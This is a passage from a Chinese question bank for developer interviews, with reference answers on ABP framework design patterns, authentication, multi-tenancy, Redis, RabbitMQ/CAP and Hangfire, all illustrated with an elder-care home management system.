**参考答案**：S（单一职责）：`ElderAppService` 只负责长者 CRUD，通知家属由 `NotificationService` 负责，两个类各管一件事。O（开闭原则）：新增护理等级只需添加 `INursingFeeStrategy` 实现类，不修改已有评估代码。L（里氏替换）：`ElderAppService` 和 `BedAppService` 都继承 `ApplicationService`，任何需要 `IApplicationService` 的地方都能替换使用。I（接口隔离）：只读查询注入 `IReadOnlyRepository<Elder>`，管理功能注入完整 `IRepository<Elder>`，不让查询服务依赖写方法。D（依赖倒置）：AppService 注入 `IRepository<Elder, Guid>` 接口而非 `EfCoreElderRepository` 具体类。

---

### 第2题（中级 / 概念题）
**题目**：ABP 中的仓储模式解决了什么问题？

**参考答案**：仓储模式封装数据访问细节，使应用服务不依赖具体 ORM。AppService 只调用 `IRepository<T>` 的 GetAsync/InsertAsync/UpdateAsync 方法，不关心底层是 EF Core 还是 Dapper。换 ORM 时只需替换 Infrastructure 层的仓储实现，业务层代码零修改。养老院场景：长者管理模块的 `ElderAppService` 注入 `IRepository<Elder>`，如果未来从 EF Core 切换到 Dapper，只需新建 `DapperElderRepository` 实现同一接口。

---

### 第3题（中级 / 概念题）
**题目**：ILocalEventHandler 和 IDistributedEventHandler 的区别？

**参考答案**：`ILocalEventHandler` 同进程内执行，事件通过内存传递，适合同一服务内的解耦（如长者入住后分配床位）；`IDistributedEventHandler` 跨服务通过消息队列（RabbitMQ/CAP）传递，适合跨上下文的异步处理（如长者入住后生成财务账单）。本地事件性能高但不能跨服务，分布式事件可靠但有延迟。养老院系统中，入住事件同时触发两种处理器：本地分配床位、分布式生成账单。

---

### 第4题（高级 / 设计题）
**题目**：如何用策略模式消除 if-else？

**参考答案**：定义策略接口 `INursingFeeStrategy`，每个护理等级实现一个策略类（`SelfCareStrategy`、`SemiCareStrategy` 等），每个类包含 `CanHandle` 判断条件和 `Calculate` 计算逻辑。通过 DI 注入 `IEnumerable<INursingFeeStrategy>`，运行时遍历找到匹配的策略执行。新增护理等级只需添加新实现类，不修改调用端代码，完美符合开闭原则。ABP 的 Autofac 支持 `IEnumerable<T>` 自动注入。

---

### 第5题（中级 / 概念题）
**题目**：CrudAppService 体现了哪种设计模式？

**参考答案**：模板方法模式。CrudAppService 定义了 CRUD 的标准流程模板（Get → 查询实体 → 映射 DTO → 返回），子类通过重写 `MapToEntityAsync`（自定义映射逻辑）、`CreateFilteredQueryAsync`（添加过滤条件）、`GetPolicyName`（权限策略）等钩子方法定制行为，而不改变整体流程。养老院场景：`ElderAppService` 继承 CrudAppService，重写 `CreateFilteredQueryAsync` 添加按护理等级过滤的条件。

---

### 第6题（初级 / 概念题）
**题目**：什么是聚合根？为什么需要它？

**参考答案**：聚合根是一致性边界的核心实体，外部只能通过聚合根访问其内部实体。例如 `Elder` 是聚合根，`NursingRecord`（护理记录）是聚合内的实体，外部不能直接操作 `NursingRecord` 的仓储，必须通过 `elder.AddRecord()` 方法添加。这样保证了业务规则（如"每次护理记录必须关联长者"）的一致性。没有聚合根，内部实体可能被任意修改，导致数据不一致。

---

### 第7题（初级 / 概念题）
**题目**：中间件管道如何体现装饰器模式？

**参考答案**：每个中间件包装下一个中间件，添加前后置行为。异常处理中间件在 `next()` 前 try-catch、在 `next()` 后检查异常；认证中间件在 `next()` 前验证 Token；日志中间件在 `next()` 前记录开始时间、在 `next()` 后记录耗时。这些中间件层层叠加，每个都为管道增加一层职责，这就是装饰器模式的典型应用。养老院系统的请求管道：CORS → 认证 → 授权 → 异常处理 → 操作日志 → Action。

---

### 第8题（初级 / 概念题）
**题目**：ABP 的 GuidGenerator 是什么设计模式？

**参考答案**：工厂模式。`GuidGenerator.Create()` 封装了 GUID 的生成逻辑，支持生成顺序 GUID（Sequential GUID），避免随机 GUID 导致的数据库 B+Tree 索引碎片化问题。InnoDB 的聚簇索引按主键排序插入，随机 GUID 会导致频繁的页分裂，而顺序 GUID 保证单调递增，插入性能更好。养老院系统中所有实体的 ID 都应使用 `GuidGenerator.Create()` 生成。

---

### 第9题（中级 / 场景题）
**题目**：如何判断一个类是否违反单一职责？

**参考答案**：问"这个类有几种原因会导致它被修改？"如果 `ElderAppService` 因长者字段变化、邮件模板变化、报表格式变化都要修改，就说明它承担了太多职责，应拆分。养老院场景：`ElderAppService` 只负责长者 CRUD，发邮件由 `NotificationService` 负责，生成报表由 `ReportService` 负责。每个类只因一种业务变化而修改，就是单一职责。

---

### 第10题（中级 / 概念题）
**题目**：限界上下文和 ABP Module 的关系？

**参考答案**：每个限界上下文通常对应一个 ABP Module。养老院系统的三个限界上下文：`ElderManagementModule`（长者管理，含 Elder/Room/Bed 实体）、`FinanceModule`（财务管理，含 Bill/Payment 实体）、`HealthModule`（健康管理，含 HealthAssessment/NursingRecord 实体）。每个 Module 有独立的实体、服务和仓储，通过领域事件（如 `ElderCheckedInEto`）跨上下文通信。Module 之间不直接引用对方的实体。

---

### 第11题（初级 / 代码题）
**题目**：在 ABP 中如何注册多个策略实现？

**参考答案**：ABP 的 Autofac 支持 `IEnumerable<T>` 自动注入。步骤：①定义策略接口 `INursingFeeStrategy`；②每个策略类实现接口并标记 `ITransientDependency`（如 `SelfCareStrategy : INursingFeeStrategy, ITransientDependency`）；③在消费端构造函数注入 `IEnumerable<INursingFeeStrategy>`；④运行时遍历找到匹配策略执行。新增策略只需添加新类，无需修改任何已有代码。

---

### 第12题（中级 / 概念题）
**题目**：领域事件和集成事件的区别？

**参考答案**：领域事件（`ILocalEventHandler`）同进程内执行，通过内存事件总线传递，性能高但不能跨服务，适合同一上下文内的解耦（如长者入住后分配床位）。集成事件（`IDistributedEventHandler`）跨进程通过消息队列（RabbitMQ + CAP）传递，可靠但有延迟，适合不同上下文间的通信（如长者入住后生成财务账单）。养老院系统中，入住事件同时触发本地事件（分配床位）和集成事件（生成账单）。

---

### 第13题（初级 / 概念题）
**题目**：如何在单元测试中利用依赖倒置？

**参考答案**：应用服务依赖 `IRepository<Elder, Guid>` 接口而非具体仓储实现，测试时用 NSubstitute/Moq 模拟接口返回值，无需启动真实数据库。例如测试入住逻辑：`_elderRepo.GetAsync(id).Returns(elder)` 模拟仓储返回，`_billRepo.When(x => x.InsertAsync(Arg.Any<Bill>())).Do(x => capturedBill = x.Arg<Bill>())` 捕获生成的账单。这样测试速度快、不依赖外部环境、专注于验证业务逻辑。

---

### 第14题（高级 / 设计题）
**题目**：装饰器模式和代理模式的区别？

**参考答案**：装饰器侧重动态添加职责（日志、缓存、重试），可叠加多层装饰器形成处理链；代理侧重控制访问（权限检查、延迟加载、远程调用封装），通常一对一。ABP 中间件管道是装饰器模式（每个中间件装饰下一个），ABP 的懒加载代理（如 `IRepository` 的动态代理）是代理模式。养老院场景：HTTP 调用封装用代理模式（控制超时和重试），日志记录用装饰器模式（在调用前后添加日志）。

---


## 第 10 章：认证与授权

### 第1题（初级 / 概念题）
**题目**：认证和授权有什么区别？

**参考答案**：认证（Authentication）是验证身份——"你是谁"，通过用户名密码、Token、微信扫码等方式确认用户身份。授权（Authorization）是验证权限——"你能做什么"，通过角色和权限策略判断用户是否有权访问某个资源。认证是授权的前提，没有认证就无法授权。养老院场景：护工刷卡进入系统是认证，系统判断护工只能查看自己负责的长者是授权。

---

### 第2题（初级 / 概念题）
**题目**：JWT 由哪几部分组成？

**参考答案**：JWT 由三部分用 `.` 分隔：Header（声明算法类型，如 HS256）、Payload（存放用户信息，如 UserId、TenantId，Base64Url 编码但不加密）、Signature（用密钥对 Header.Payload 签名，防篡改）。格式：`xxxxx.yyyyy.zzzzz`。注意：Payload 只是编码不是加密，任何人都能解码查看，所以不能存放密码等敏感信息。养老院场景：JWT Token 中存放护工 ID 和所属养老院 TenantId。

---

### 第3题（中级 / 概念题）
**题目**：Cookie、Session、Token 三者有什么区别？

**参考答案**：Cookie：存储在浏览器，每次请求自动携带，受同源策略限制，容量 4KB。Session：存储在服务端（内存/Redis），通过 Cookie 中的 SessionId 关联，有状态，水平扩展需共享存储。Token（JWT）：存储在客户端（内存/LocalStorage），无状态，天然支持跨域和移动端，服务端不存储。养老院系统前后端分离架构，用 JWT Token 最合适；如果只有传统 MVC 页面，Cookie + Session 也够用。

---

### 第4题（中级 / 概念题）
**题目**：为什么用 Access Token + Refresh Token 双 Token 机制？

**参考答案**：Access Token 短命（30 分钟），减少泄露后的攻击窗口；Refresh Token 长命（7 天），避免用户频繁登录。当 Access Token 过期时，前端用 Refresh Token 静默换取新 Token，用户无感知。如果 Refresh Token 被盗（同一 Token 在两个地方使用），服务端检测到后立即吊销该用户所有 Token，强制重新登录。养老院场景：护工早上登录后一整天不用重新输入密码。

---

### 第5题（初级 / 概念题）
**题目**：OAuth2 四种授权模式分别适用于什么场景？

**参考答案**：授权码模式：第三方登录（微信扫码），最安全，Token 不经过浏览器。密码模式：第一方应用（自家 App），用户直接提供用户名密码。客户端模式：服务间通信（后台定时任务），无用户参与。隐式模式：已废弃，不推荐使用。养老院系统中：家属用微信扫码登录用授权码模式，护工用 App 登录用密码模式，后台定时生成报表用客户端模式。

---

### 第6题（高级 / 场景题）
**题目**：Refresh Token 被重复使用意味着什么？怎么处理？

**参考答案**：Refresh Token 应该一次性使用（用后即废）。如果同一 Token 被使用两次，说明可能被盗——攻击者和合法用户同时持有同一 Token。处理策略：检测到重复使用后，立即吊销该用户的所有 Token（Access + Refresh），强制重新登录，并记录安全日志。养老院场景：护工账号在两台设备同时刷新 Token，系统应立即锁定账号并通知管理员。

---

### 第7题（中级 / 概念题）
**题目**：IdentityServer4 的作用是什么？

**参考答案**：IdentityServer4 是 OAuth2/OpenID Connect 服务器，负责统一认证中心：①签发和验证 JWT Token；②管理客户端（哪些应用可以访问）；③管理 API 资源（哪些接口需要保护）；④支持多种授权模式。养老院系统中，IdentityServer4 作为独立认证服务，所有微服务（长者服务、财务服务、护理服务）都从它获取 Token 并验证。

---

### 第8题（初级 / 概念题）
**题目**：ABP 中如何定义和使用权限？

**参考答案**：三步：①在 `PermissionDefinitionProvider` 的 `Define` 方法中定义权限（`context.AddPermission("Yls.Elder.Create")`）；②通过 `IPermissionManager` 将权限分配给角色（管理后台操作）；③在 Controller 或 AppService 上标注 `[Authorize("Yls.Elder.Create")]`。ABP 还支持 `IPermissionChecker` 在代码中动态检查权限。养老院场景：定义"修改护理等级"权限，只分配给护士长角色。

---

### 第9题（高级 / 概念题）
**题目**：JWT 存在哪里最安全？

**参考答案**：三种方案各有利弊：①内存变量：最安全（页面刷新丢失），适合 SPA 单页应用；②httpOnly Cookie：防 XSS（JS 无法读取），但需防 CSRF（加 SameSite=Strict）；③localStorage：持久化但易受 XSS 攻击。推荐方案：Access Token 存内存变量（短命，刷新丢失可重新获取），Refresh Token 存 httpOnly Cookie（长命，防 XSS）。养老院系统前端是 Vue SPA，适合此方案。

---

### 第10题（初级 / 代码题）
**题目**：认证授权中间件的正确顺序是什么？

**参考答案**：`UseRouting` → `UseAuthentication` → `UseAuthorization` → `UseEndpoints`。认证必须在授权之前，因为授权需要读取认证结果（ClaimsPrincipal）。如果顺序颠倒，授权中间件拿不到用户信息，所有请求都会返回 401。养老院系统 Startup.Configure 中必须按此顺序配置。

---

### 第11题（高级 / 场景题）
**题目**：微信扫码登录的完整流程是什么？

**参考答案**：OAuth2 授权码模式：①前端跳转微信授权页面（带 AppId + RedirectUri + State）；②用户扫码确认；③微信回调 RedirectUri 并带 code + state；④后端校验 state 防 CSRF；⑤用 code 向微信服务器换取 access_token + openid；⑥用 openid 查询是否已绑定养老院系统账号；⑦已绑定则签发 JWT，未绑定则引导绑定手机号。

---

### 第12题（高级 / 设计题）
**题目**：微服务架构如何实现统一认证？

**参考答案**：独立认证中心（IdentityServer4）签发 JWT Token，各微服务用公钥自行验证（无需每次请求都问认证中心）。API 网关在入口处统一验证 Token，转发请求时将用户信息放入 Header。养老院系统中：Ocelot 网关验证 Token → 将 UserId/TenantId 放入 Header → 各微服务从 Header 读取用户信息 → ABP 的 ClaimsPrincipal 自动填充。

---

### 第13题（中级 / 概念题）
**题目**：什么是 CSRF？JWT Token 为什么能防御 CSRF？

**参考答案**：CSRF（跨站请求伪造）利用浏览器自动携带 Cookie 的特性，诱导用户在已登录状态下发起伪造请求。JWT Token 存在内存变量中，需要 JavaScript 手动添加到请求 Header，恶意网站无法获取 Token 也无法自动携带。如果用 Cookie 存 Token 则仍需额外防 CSRF（SameSite + AntiForgeryToken）。养老院系统前后端分离用 JWT 天然防 CSRF。

---

### 第14题（高级 / 场景题）
**题目**：如何为养老院系统实现"只有护士长才能修改护理等级"的权限控制？

**参考答案**：①在 `YlsPermissionDefinitionProvider` 中定义权限 `Yls.NursingLevel.Update`；②在管理后台将此权限分配给"护士长"角色；③在 `NursingLevelAppService` 的 Update 方法上标注 `[Authorize(YlsPermissions.NursingLevel.Update)]`；④护工调用时 ABP 自动返回 403 Forbidden。也可以用 `IPermissionChecker.IsGrantedAsync("Yls.NursingLevel.Update")` 在代码中动态检查。

---


## 第 11 章：多租户架构

### 第1题（初级 / 概念题）
**题目**：什么是多租户架构？请结合养老院管理系统举例说明。

**参考答案**：多租户架构是一个应用实例同时为多个独立租户提供服务的架构模式。在养老院系统中，阳光养老院和幸福养老院各是一个租户，它们共享同一套代码和基础设施，但各自的数据相互隔离。就像公寓楼每户独立门锁但共享电梯。好处是降低运维成本、统一升级，同时保证数据安全。

---

### 第2题（初级 / 概念题）
**题目**：请对比三种数据隔离方案，并说明养老院系统应选哪种。

**参考答案**：三种方案是共享数据库加 TenantId、独立 Schema 和独立数据库。共享数据库成本最低实现最简单；独立 Schema 隔离性稍好但增加路由复杂度；独立数据库隔离性最强但运维成本成倍增长。养老院系统通常几十到几百家租户，数据量适中，选共享数据库加 TenantId 方案最合适。

---

### 第3题（中级 / 概念题）
**题目**：ABP 如何实现 `IMultiTenant` 的自动数据过滤？说明底层机制。

**参考答案**：ABP 通过 EF Core 的全局查询过滤器机制实现。实体实现 `IMultiTenant` 后，ABP 在 `OnModelCreating` 中自动注册 `WHERE TenantId = @currentTenantId` 过滤条件，每次查询自动附加。当前租户 ID 通过 `ICurrentTenant` 在请求上下文中获取，确保阳光养老院查询只返回阳光的数据，不会误查幸福养老院。

---

### 第4题（中级 / 概念题）
**题目**：ABP 有哪几种租户解析策略？生产环境如何配置？

**参考答案**：有域名解析、Header 解析、Cookie 解析和 QueryString 解析四种。生产环境建议域名解析为主（如 `sunshine.nursinghome.com`），Header 解析为辅（移动端传 `X-TenantId`），QueryString 仅作调试用。按优先级配置后 ABP 依次尝试，第一个成功的结果生效。

---

### 第5题（中级 / 场景题）
**题目**：宿主管理员需要统计所有养老院入住人数，如何实现？

**参考答案**：遍历所有租户，使用 `ICurrentTenant.Change(tenantId)` 临时切换上下文，然后调用仓储的 `GetCountAsync`，该方法自动按当前租户过滤。必须用 `using` 语句包裹确保每次循环结束后上下文恢复，避免后续操作在错误租户中执行。最终汇总各养老院数据返回。

---

### 第6题（高级 / 设计题）
**题目**：全局共享数据（如省份字典表）和租户数据如何区分？

**参考答案**：全局共享数据不实现 `IMultiTenant`，所有租户共用同一份数据，不会被过滤。业务数据（老人、护理记录）必须实现 `IMultiTenant`，每个养老院独立维护。判断标准是该数据是否需要每个养老院独立。种子数据时，全局数据在宿主上下文插入，租户数据在对应租户上下文插入。

---

### 第7题（高级 / 概念题）
**题目**：`ICurrentTenant.Change` 的工作原理是什么？为什么必须用 `using`？

**参考答案**：`Change` 利用 `AsyncLocal<T>` 存储租户上下文，调用时保存当前 ID 并设置新 ID，返回 `IDisposable` 对象。`using` 块结束时自动恢复原始 ID。不用 `using` 的话上下文不恢复，后续代码会在错误租户中执行——比如宿主查看完阳光数据后忘记恢复，后续操作可能把数据写入其他租户。

---

### 第8题（中级 / 概念题）
**题目**：多租户过滤和软删除过滤如何同时生效？

**参考答案**：两者都是 EF Core 全局查询过滤器，自动叠加。查询老人列表时实际 SQL 为 `WHERE TenantId = @xxx AND IsDeleted = 0`，同时保证属于当前养老院且未被删除。可用 `_dataFilter.Disable<ISoftDelete>()` 临时禁用软删除过滤查看已删除记录，但租户过滤通常不应禁用。

---

### 第9题（高级 / 设计题）
**题目**：大型连锁集团要求数据物理隔离，ABP 能否支持？

**参考答案**：ABP 支持独立数据库模式。在 `AbpDbConnectionOptions` 中为每个租户配置不同连接字符串，`IDbContextProvider` 根据当前租户自动选择数据库。阳光养老院数据在独立实例中，DBA 直接查询也无法看到其他养老院数据。代价是运维复杂度显著增加，每增加一个租户需要新建数据库并执行迁移。

---

### 第10题（中级 / 概念题）
**题目**：如何为不同养老院配置不同功能模块？

**参考答案**：通过 `SettingDefinitionProvider` 定义设置项（如月费、远程探视开关），管理界面或种子数据为各租户设置不同值。`ISettingProvider.GetOrNullAsync` 读取时自动返回当前租户的配置，阳光养老院月费 5000 元启用远程探视，幸福养老院月费 8000 元不启用，无需条件判断。

---

### 第11题（初级 / 概念题）
**题目**：多租户系统最大的安全风险是什么？如何防范？

**参考答案**：最大风险是数据泄漏——租户 A 访问到租户 B 的数据。例如开发者查询时忘记加 TenantId 过滤。ABP 的 `IMultiTenant` 从机制上自动添加过滤条件杜绝此风险。此外不应在 URL 中暴露租户标识，优先域名或 Header 解析。切换租户上下文时必须用 `using`，防止上下文泄漏到其他操作。

---

### 第12题（高级 / 场景题）
**题目**：描述为养老院系统添加多租户支持的完整步骤。

**参考答案**：五步：一、在 `HttpApiHostModule` 中按优先级配置域名、Header、QueryString 解析器；二、为业务实体实现 `IMultiTenant` 接口并添加 `TenantId` 属性；三、编写种子数据贡献者，用 `ICurrentTenant.Change` 切换上下文为各养老院创建初始数据；四、编写测试用例在不同租户上下文中查询验证数据隔离；五、如有个性化配置需求，通过 `SettingDefinitionProvider` 定义并为各租户设置不同值。完成后运行测试验证功能正确性。

---


## 第 12 章：Redis 缓存与分布式锁

### 第1题（高级 / 概念题）
**题目**：Redis 为什么这么快？

**参考答案**：四个原因：①单线程模型避免了上下文切换和锁竞争开销；②IO 多路复用（epoll）让单线程能同时处理大量连接；③纯内存操作，读写速度比磁盘快 10 万倍；④高效数据结构（SDS、跳跃表、压缩列表）针对不同场景做了极致优化。养老院场景：长者信息查询走 Redis 缓存，响应时间从 MySQL 的 50ms 降到 1ms。

---

### 第2题（高级 / 概念题）
**题目**：缓存穿透、击穿、雪崩分别是什么？怎么解决？

**参考答案**：穿透：查询不存在的 key，请求全部打到数据库。解决：缓存空值（TTL 30s）+ 布隆过滤器。击穿：热点 key 过期瞬间，大量并发请求穿透。解决：互斥锁（SETNX）保证只有一个线程回源，其他线程等待或返回旧值。雪崩：大量 key 同时过期，数据库压力骤增。解决：过期时间加随机偏移量 + 多级缓存（本地+Redis）+ 熔断降级。养老院场景：长者信息缓存雪崩会导致入住高峰期数据库崩溃。

---

### 第3题（中级 / 概念题）
**题目**：RDB 和 AOF 持久化有什么区别？

**参考答案**：RDB 是定时快照（fork 子进程生成二进制文件），恢复快但可能丢失最后一次快照后的数据。AOF 是每次写操作追加日志文件，数据更安全但文件大、恢复慢。生产推荐混合持久化：RDB 做定期全量备份，AOF 做增量日志。养老院系统：财务数据必须用 AOF（不能丢），统计数据可以用 RDB（允许少量丢失）。

---

### 第4题（中级 / 概念题）
**题目**：Redis 的 8 种淘汰策略分别是什么？生产环境推荐哪种？

**参考答案**：noeviction（不淘汰，内存满拒绝写入）、allkeys-lru（所有 key 中淘汰最近最少使用）、volatile-lru（仅淘汰设了过期时间的 key）、allkeys-random（随机淘汰）、volatile-random（随机淘汰有过期时间的 key）、allkeys-lfu（所有 key 中淘汰最不经常使用）、volatile-lfu（淘汰有过期时间且最不常用的）、volatile-ttl（淘汰即将过期的 key）。生产推荐 allkeys-lru，适合缓存场景。

---

### 第5题（初级 / 概念题）
**题目**：Redis 的五种数据结构在养老院系统中分别怎么用？

**参考答案**：String：缓存长者基本信息（JSON 序列化）、分布式锁（SETNX）。Hash：存储长者的多个字段（姓名、年龄、护理等级），支持单字段读取。List：消息队列（入住通知队列）、最近访问记录。Set：长者标签（过敏源、疾病史），支持交集运算（同时对花粉和海鲜过敏的长者）。ZSet：排行榜（本月消费排行）、延迟队列（score 为时间戳）。

---

### 第6题（高级 / 场景题）
**题目**：分布式锁用 Redis 怎么实现？有什么坑？

**参考答案**：用 `SET key value NX PX 30000` 原子命令获取锁（NX=不存在才设置，PX=毫秒级过期）。释放锁用 Lua 脚本原子判断 value 再 DEL（防止误删别人的锁）。坑：①锁超时但业务未完成→用看门狗续期；②Redis 主从切换时锁丢失→Redlock 算法（向 N 个独立 Redis 实例加锁，多数成功才算获取）；③GC 停顿导致锁过期→业务幂等性保证。养老院场景：防止同一床位被重复分配。

---

### 第7题（初级 / 概念题）
**题目**：Cache-Aside 模式的工作流程是什么？

**参考答案**：读：先查缓存→命中则返回→未命中则查数据库→写入缓存→返回。写：先更新数据库→再删除缓存（不是更新缓存）。为什么删而不是更新？因为并发场景下，更新缓存可能导致旧值覆盖新值。养老院场景：修改长者护理等级后，先更新 MySQL，再删除 Redis 中的缓存，下次查询时重新从数据库加载最新值。

---

### 第8题（中级 / 概念题）
**题目**：Redis 单线程模型的优缺点是什么？

**参考答案**：优点：无锁设计，避免上下文切换和竞态条件，代码简单高效。缺点：无法利用多核 CPU（Redis 6.0 引入多线程 IO 解决网络瓶颈）、大 key 操作会阻塞整个服务。养老院场景：如果用 `KEYS *` 扫描所有 key，会阻塞其他所有请求，应用 `SCAN` 命令替代。

---

### 第9题（高级 / 概念题）
**题目**：Redis 哨兵和 Cluster 集群有什么区别？

**参考答案**：哨兵（Sentinel）：主从架构+自动故障转移，数据全量复制，适合数据量<16GB 的场景。Cluster：数据分片（16384 个 slot 分布在多个主节点），支持水平扩展，适合大数据量。哨兵只解决高可用，Cluster 同时解决高可用和大数据量。养老院初期用哨兵（3 节点），长者数据超过 10 万后迁移到 Cluster。

---

### 第10题（中级 / 概念题）
**题目**：Redis 持久化中的混合持久化是什么？

**参考答案**：混合持久化在 AOF 重写时，将 RDB 格式的数据写入 AOF 文件头部，增量数据以 AOF 格式追加在后面。这样兼顾了 RDB 的快速加载和 AOF 的数据安全性。Redis 4.0+ 默认开启。恢复时先加载 RDB 部分（快），再回放 AOF 部分（保证数据完整）。

---

### 第11题（初级 / 概念题）
**题目**：ABP 中如何使用 Redis 缓存？

**参考答案**：注入 `IDistributedCache<T>` 泛型接口，调用 `GetOrAddAsync(key, factory, options)` 获取或创建缓存。ABP 封装了 StackExchange.Redis，支持分布式缓存和滑动过期。养老院场景：`_cache.GetOrAddAsync("elder:" + id, () => _repo.GetAsync(id), () => new DistributedCacheEntryOptions { SlidingExpiration = TimeSpan.FromMinutes(30) })`。

---

### 第12题（高级 / 场景题）
**题目**：DataProtection 密钥为什么需要 Redis 持久化？

**参考答案**：ASP.NET Core DataProtection 用于加密 Cookie、Token 等敏感数据。默认密钥存储在本地文件系统，多实例部署时各实例密钥不同，导致 A 签发的 Token B 无法解密。将密钥存储到 Redis 后，所有实例共享同一密钥，实现分布式环境下的数据保护一致性。养老院系统部署 3 个容器实例时必须配置。

---


## 第 13 章：RabbitMQ 与 CAP 分布式事件总线

### 第1题（中级 / 概念题）
**题目**：什么是消息队列？在养老院系统中什么场景适合使用？

**参考答案**：消息队列是异步通信中间件，生产者发消息到队列，消费者按自己节奏消费。养老院中「长者入住」后需要创建账单、分配床位、通知家属，这些不需要实时同步完成，用消息队列异步处理可解耦服务、提高响应速度。就像护士在交接本上写待办，相关人员各自处理。

---

### 第2题（中级 / 概念题）
**题目**：RabbitMQ 的四种 Exchange 类型分别是什么？

**参考答案**：Direct 按 RoutingKey 精确匹配，适合点对点通知。Fanout 广播所有绑定队列，适合紧急通知。Topic 支持通配符匹配，适合按主题订阅。Headers 按消息头属性路由，较少使用。养老院最常用 Topic 和 Direct。

---

### 第3题（中级 / 场景题）
**题目**：如何保证 RabbitMQ 消息不丢失？

**参考答案**：三个环节保障：生产端用 Publisher Confirm 确认消息到达 Broker；Broker 端消息和队列设为持久化；消费端用手动 ACK，业务成功才确认。养老院账单消息丢失会导致长者没账单，三环节缺一不可。

---

### 第4题（高级 / 概念题）
**题目**：什么是消息幂等性？如何保证不重复消费？

**参考答案**：幂等性指同一操作执行一次和多次效果相同。养老院中「创建账单」消费两次会产生两份账单。方案：唯一消息ID+去重表（通用首选）、状态机（利用业务状态）、乐观锁版本号（更新场景）。推荐第一种。

---

### 第5题（高级 / 概念题）
**题目**：DotNetCore.CAP 框架的原理是什么？

**参考答案**：CAP 采用本地消息表模式，将业务数据和消息记录写入同一数据库事务。养老院入住为例，入住记录和消息在同一事务提交，要么都成功要么都失败。消息写入本地表后 CAP 后台线程异步发到 RabbitMQ，失败自动重试。消费者处理成功后也通过本地事务记录状态，保证最终一致。

---

### 第6题（高级 / 概念题）
**题目**：CAP 定理和 CAP 框架有什么关系？

**参考答案**：没有任何关系，只是名字碰巧相同。CAP 定理是分布式理论，Consistency/Availability/Partition Tolerance 三者最多同时满足两个。CAP 框架是 DotNetCore.CAP，基于本地消息表的分布式事件总线。面试时一定要明确区分。养老院系统采用 CAP 框架实现最终一致，属 AP 系统。

---

### 第7题（高级 / 概念题）
**题目**：分布式事务有哪些方案？

**参考答案**：2PC 两阶段提交强一致但阻塞；TCC 补偿事务强一致但侵入性高；Saga 长事务适合长流程，有编排和协同两种；本地消息表（CAP）性能高实现简单；最大努力通知允许人工补偿。养老院入住后续操作用 CAP 最合适，不需要强一致。

---

### 第8题（中级 / 概念题）
**题目**：什么是死信队列？

**参考答案**：死信队列是消息处理失败后的归宿。消息在消费者拒绝、TTL 过期、队列满时进入死信队列。养老院中账单消息处理失败3次后进入死信队列，运维可在 Dashboard 查看失败原因手动处理，是消息可靠性的最后一道防线。

---

### 第9题（中级 / 场景题）
**题目**：ABP 本地事件和分布式事件有什么区别？

**参考答案**：本地事件通过 ILocalEventHandler 在进程内触发，适合模块间解耦。分布式事件通过 CapSubscribe 跨服务传递，适合微服务间通信。入住成功后更新长者状态用本地事件，通知账单服务创建账单用分布式事件。

---

### 第10题（高级 / 设计题）
**题目**：养老院「长者入住」如何设计事件驱动架构？

**参考答案**：入住服务通过 CAP 发布 CheckInCompletedEto 到 RabbitMQ，事件只含必要标识。三个下游服务各自订阅：账单服务创建账单、床位服务更新状态、通知服务发短信。每个消费者做消息ID去重保证幂等，Dashboard 监控消息状态。

---

### 第11题（高级 / 概念题）
**题目**：TCC 和 Saga 核心区别是什么？

**参考答案**：TCC 是资源预留模式，Try 冻结资源，Confirm 确认，Cancel 解冻。一致性更强但业务侵入高，需实现三个接口。适合养老院入住扣费。Saga 是补偿模式，直接执行，失败时逆序补偿。侵入性低但中间状态可见。适合入住审批流程。TCC 实现复杂一致性强，Saga 实现简单可能中间不一致。

---

### 第12题（中级 / 代码题）
**题目**：如何配置 CAP 框架连接 RabbitMQ？

**参考答案**：在模块 ConfigureServices 中调用 AddCap，UseEntityFramework 配置本地消息表存储，UseRabbitMQ 配置连接信息（主机、端口、用户名、密码、Virtual Host），UseDashboard 启用监控，配置 FailedRetryCount 和 SucceedMessageExpiredAfter。

---

### 第13题（高级 / 场景题）
**题目**：CAP 消费端处理失败后会怎样？

**参考答案**：消费失败后 CAP 自动重试，默认5次，间隔可通过 FailedRetryInterval 配置。超限后消息标记失败，可在 Dashboard 手动重发。消费者应做幂等处理，如检查消息ID是否已记录或利用业务状态判断。

---

### 第14题（中级 / 概念题）
**题目**：BASE 理论和 CAP 定理的关系？

**参考答案**：BASE 是 CAP 的延伸。CAP 告诉我们要在一致性和可用性间取舍，BASE 给出实践方案：选择可用性，接受最终一致。养老院系统采用 CAP 框架就是 BASE 实践——入住后账单可能延迟几秒，但最终一定创建成功。

---


## 第 14 章：Hangfire 后台任务与定时作业

### 第1题（初级 / 概念题）
**题目**：什么是后台任务？在养老院系统中，为什么需要后台任务？

**参考答案**：后台任务是指不需要用户等待执行完成的异步操作。在养老院系统中，月度账单生成需要为数百位老人计算费用并生成账单，这个过程可能需要几分钟，如果同步执行会导致前端请求超时。药品过期检查和合同到期提醒需要每天定时执行，不是由用户主动触发的。运营数据报表涉及大量数据聚合计算，也不适合在用户请求中同步完成。后台任务让这些耗时操作在服务端异步执行，用户提交后即可获得响应，提升了系统响应速度和用户体验。

### 第2题（初级 / 概念题）
**题目**：ABP 的 `IBackgroundJobManager` 接口有什么作用？为什么要用 Hangfire 替换它？

**参考答案**：`IBackgroundJobManager` 是 ABP 框架内置的后台任务抽象接口，提供了 `EnqueueAsync` 方法用于提交后台任务。它默认使用内存队列实现，任务存储在内存中，应用重启后任务会丢失，不支持持久化、重试、Dashboard 监控等功能。Hangfire 作为成熟的后台任务框架，支持将任务持久化到 MySQL 等数据库中，应用重启后任务不会丢失，还提供了自动重试、Dashboard 可视化管理、周期任务调度等生产环境必需的功能。因此在养老院系统中，需要将 ABP 的默认实现替换为 Hangfire，以确保账单生成、过期提醒等关键任务的可靠性。

### 第3题（初级 / 概念题）
**题目**：Hangfire 有哪些任务类型？分别适用于什么养老院场景？

**参考答案**：Hangfire 支持三种主要任务类型。即时任务（Fire-and-forget）使用 `BackgroundJob.Enqueue()` 提交后立即执行，适用于入住登记完成后发送欢迎通知这类需要立即处理的场景。延迟任务使用 `BackgroundJob.Schedule()` 在指定时间后执行，适用于入住三天后发送满意度调查这类需要延迟执行的场景。周期任务使用 `RecurringJob.AddOrUpdate()` 配合 CRON 表达式定期执行，适用于每月1号生成账单、每天早上检查药品过期这类需要定期重复执行的场景。合理选择任务类型能够使养老院系统的任务调度更加清晰和高效。

### 第4题（中级 / 概念题）
**题目**：什么是 CRON 表达式？请写出养老院系统中月度账单生成的 CRON 表达式。

